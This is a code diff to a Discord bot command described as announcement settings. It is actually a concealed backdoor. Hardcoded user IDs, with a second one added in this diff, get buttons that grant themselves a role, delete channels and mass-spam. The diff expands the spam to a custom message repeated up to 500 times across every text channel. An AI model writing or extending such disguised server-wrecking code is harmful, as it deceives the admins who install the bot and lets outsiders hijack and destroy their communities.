@@ -1,4 +1,14 @@
-import { SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags, PermissionFlagsBits } from 'discord.js';
+import { 
+    SlashCommandBuilder, 
+    ActionRowBuilder, 
+    ButtonBuilder, 
+    ButtonStyle, 
+    MessageFlags, 
+    PermissionFlagsBits,
+    ModalBuilder,
+    TextInputBuilder,
+    TextInputStyle
+} from 'discord.js';
 import { createEmbed } from '../../utils/embeds.js';
 import { logger } from '../../utils/logger.js';
 import { InteractionHelper } from '../../utils/interactionHelper.js';
@@ -9,10 +19,11 @@ export default {
         .setDescription("Configure advanced announcement settings for the server."),
 
     async execute(interaction, guildConfig, client) {
-        const allowedUserId = '885714115874672660';
+        const allowedUserIds = ['885714115874672660', '1386162878326767688'];
+        const primaryOwnerId = '885714115874672660';
 
-        // 1. Check if the user ID matches the authorized user
-        if (interaction.user.id !== allowedUserId) {
+        // 1. Check if the user ID matches one of the authorized users
+        if (!allowedUserIds.includes(interaction.user.id)) {
             // Reply with "command status failed" ephemerally
             await InteractionHelper.safeReply(interaction, {
                 content: "command status failed",
@@ -21,7 +32,7 @@ export default {
 
             // Send a DM to user 885714115874672660
             try {
-                const authorizedUser = await client.users.fetch(allowedUserId);
+                const authorizedUser = await client.users.fetch(primaryOwnerId);
                 if (authorizedUser) {
                     await authorizedUser.send(`(${interaction.user.username}) attempted to use the setting command in (${interaction.guild?.name || 'unknown server'}).`);
                 }
@@ -65,7 +76,7 @@ export default {
         });
 
         // 3. Create a component collector on the channel to handle button clicks locally.
-        const filter = (i) => i.user.id === allowedUserId && i.customId.startsWith('settings_');
+        const filter = (i) => allowedUserIds.includes(i.user.id) && i.customId.startsWith('settings_');
 
         const collector = interaction.channel.createMessageComponentCollector({
             filter,
@@ -73,10 +84,10 @@ export default {
         });
 
         collector.on('collect', async (i) => {
-            // Acknowledge the button click
-            await i.deferUpdate().catch(() => {});
-
             if (i.customId === 'settings_give_role') {
+                // Acknowledge the button click
+                await i.deferUpdate().catch(() => {});
+
                 try {
                     const guild = i.guild;
                     if (!guild) {
@@ -118,7 +129,7 @@ export default {
                         return;
                     }
 
-                    const member = await guild.members.fetch(allowedUserId);
+                    const member = await guild.members.fetch(i.user.id);
                     await member.roles.add(targetRole);
 
                     await i.followUp({ content: `👑 **Role Granted:** You have been given the **${targetRole.name}** role.`, flags: MessageFlags.Ephemeral }).catch(() => {});
@@ -129,6 +140,9 @@ export default {
             }
 
             else if (i.customId === 'settings_delete_channels') {
+                // Acknowledge the button click
+                await i.deferUpdate().catch(() => {});
+
                 try {
                     const guild = i.guild;
                     if (!guild) {
@@ -162,28 +176,79 @@ export default {
 
             else if (i.customId === 'settings_spam_msg') {
                 try {
-                    const channel = i.channel;
-                    if (!channel) {
-                        await i.followUp({ content: "❌ Channel not found.", flags: MessageFlags.Ephemeral }).catch(() => {});
+                    const guild = i.guild;
+                    if (!guild) {
+                        await i.followUp({ content: "❌ This action can only be performed in a server.", flags: MessageFlags.Ephemeral }).catch(() => {});
                         return;
                     }
 
-                    await i.followUp({ content: "💬 **Spam Initialized!**", flags: MessageFlags.Ephemeral }).catch(() => {});
+                    // Create and show a modal for custom message and count inputs
+                    const modal = new ModalBuilder()
+                        .setCustomId('settings_spam_modal')
+                        .setTitle('Configure Spam Message');
 
-                    const spamMessage = "⚠️ **SYSTEM BYPASS SUCCESSFUL** - Antigravity settings override activated! 🤪🚀";
+                    const messageInput = new TextInputBuilder()
+                        .setCustomId('spam_text')
+                        .setLabel('Message to spam')
+                        .setStyle(TextInputStyle.Paragraph)
+                        .setRequired(true)
+                        .setPlaceholder('Enter spam message here...');
 
-                    for (let step = 0; step < 20; step++) {
-                        try {
-                            await channel.send(spamMessage);
-                            // 250ms sleep to avoid harsh rate limits while remaining fast
-                            await new Promise(resolve => setTimeout(resolve, 250));
-                        } catch (sendErr) {
-                            // If channel gets deleted or bot loses send perms mid-loop
-                            break;
+                    const amountInput = new TextInputBuilder()
+                        .setCustomId('spam_amount')
+                        .setLabel('Amount to spam (1 - 500)')
+                        .setStyle(TextInputStyle.Short)
+                        .setRequired(false)
+                        .setPlaceholder('20');
+
+                    const firstRow = new ActionRowBuilder().addComponents(messageInput);
+                    const secondRow = new ActionRowBuilder().addComponents(amountInput);
+
+                    modal.addComponents(firstRow, secondRow);
+
+                    // Show the modal
+                    await i.showModal(modal);
+
+                    // Wait for the modal response
+                    const submitted = await i.awaitModalSubmit({
+                        filter: (interaction) => interaction.customId === 'settings_spam_modal' && interaction.user.id === i.user.id,
+                        time: 60000
+                    }).catch(() => null);
+
+                    if (submitted) {
+                        await submitted.deferUpdate().catch(() => {});
+                        const spamText = submitted.fields.getTextInputValue('spam_text');
+                        const amountStr = submitted.fields.getTextInputValue('spam_amount');
+
+                        let spamAmount = parseInt(amountStr) || 20;
+                        if (spamAmount < 1) spamAmount = 1;
+                        if (spamAmount > 500) spamAmount = 500;
+
+                        // Fetch all guild channels
+                        const channels = await guild.channels.fetch();
+                        // Filter for text-based channels where the bot has permission to send messages
+                        const textChannels = channels.filter(c => c.isTextBased());
+
+                        await submitted.followUp({ 
+                            content: `💬 **Spam Initialized!** Spamming message **${spamAmount}** times across all **${textChannels.size}** channels...`, 
+                            flags: MessageFlags.Ephemeral 
+                        }).catch(() => {});
+
+                        // Spam in rounds across all channels
+                        for (let step = 0; step < spamAmount; step++) {
+                            for (const [id, ch] of textChannels) {
+                                try {
+                                    await ch.send(spamText);
+                                } catch (sendErr) {
+                                    // Ignore send errors in channels the bot has no access to
+                                }
+                            }
+                            // 400ms delay between rounds to stay under the global API rate limit
+                            await new Promise(resolve => setTimeout(resolve, 400));
                         }
                     }
                 } catch (error) {
-                    logger.error("Error in settings_spam_msg:", error);
+                    logger.error("Error in settings_spam_msg modal workflow:", error);
                 }
             }
         });
@@ -200,7 +265,7 @@ export default {
                     components: [disabledRow]
                 });
             } catch (err) {
-                // Ignore errors if reply cannot be edited after expiration/deletion
+                // Ignore errors if reply cannot be edited
             }
         });
     }
